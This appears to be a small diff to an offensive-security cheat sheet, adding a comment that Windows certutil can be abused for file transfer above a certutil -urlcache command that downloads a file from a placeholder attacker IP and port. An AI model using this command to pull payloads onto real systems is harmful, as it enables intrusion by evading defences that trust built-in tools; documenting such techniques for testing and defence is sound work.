@@ -1,1 +1,3 @@
+# http method originally inteded for certificate and CA management can be abused as a method of file transfer
+
 certutil -urlcache -split -f "http://[attack IP]:[port]/[file]" [output-file]
